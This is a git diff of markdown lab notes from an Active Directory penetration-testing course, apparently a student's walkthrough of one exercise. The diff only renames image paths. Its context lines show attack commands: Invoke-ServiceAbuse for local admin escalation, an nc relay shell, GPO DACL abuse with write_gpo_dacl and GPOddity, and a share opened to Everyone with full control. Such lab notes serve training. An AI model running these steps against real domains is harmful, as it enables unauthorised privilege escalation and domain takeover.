@@ -1,6 +1,6 @@
 # Learning Objetive 6
 
-<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (28) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Student VM - Name of the Group Policy attribute that is modified
 
@@ -133,7 +133,7 @@ xcopy C:\AD\Tools\student113.lnk \\dcorp-ci\AI
 Invoke-AllChecks
 ```
 
-<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>
 
 Let's use the abuse function for Invoke-ServiceAbuse and add our current domain user to the local Administrators group.
 
@@ -143,19 +143,19 @@ Let's use the abuse function for Invoke-ServiceAbuse and add our current domain 
 Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student113' -Verbose
 ```
 
-<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>
 
 <mark style="background-color:yellow;">We can see that the dcorp\studentx is a local administrator now. Just logoff and logon again and we have local administrator privileges!</mark>
 
-<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Execution All
 
 > Resume: We need the local admin to desactive the firewall to then, use wsl ubuntu with reay and .lnk in the share
 
-<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>
 
 WE HAVE VISIBILITY! So... now use nc to the next time it access, get us a shell -->
 
@@ -173,7 +173,7 @@ nc 127.0.0.1 11000
 write_gpo_dacl student113 {0BF8D01C-1F62-4BDC-958C-57140B67D147}
 ```
 
-<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Alternative - GPO abuse PC
 
@@ -231,7 +231,7 @@ sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domai
 
 > Note: Change stdx-gp to std113-gp
 
-<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>
 
 <mark style="background-color:yellow;">Leave GPOddity running and from another Ubuntu WSL session,</mark> create and share the std<mark style="background-color:yellow;">x</mark>-gp directory:
 
@@ -242,14 +242,14 @@ cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/std113-gp
 
 Great, now open a new windows shell **as administrator** to create a share (std113-gp) ad assign privileges for everyone:
 
-<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (25) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 net share std113-gp=C:\AD\Tools\std113-gp /grant:Everyone,Full
 icacls "C:\AD\Tools\std113-gp" /grant Everyone:F /T
 ```
 
-<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (26) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### Tarea Resume
 
@@ -289,7 +289,7 @@ student113 → Local Admin in dcorp-ci
 Get-DomainGPO -Identity 'DevOps Policy'
 ```
 
-<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (27) (1).png" alt=""><figcaption></figcaption></figure>
 
 <mark style="background-color:yellow;">The update for this policy is configured to be every 2 minutes in the lab</mark>. After waiting for 2 minutes, studentx should be added to the local administrators group on dcorp-ci:
 
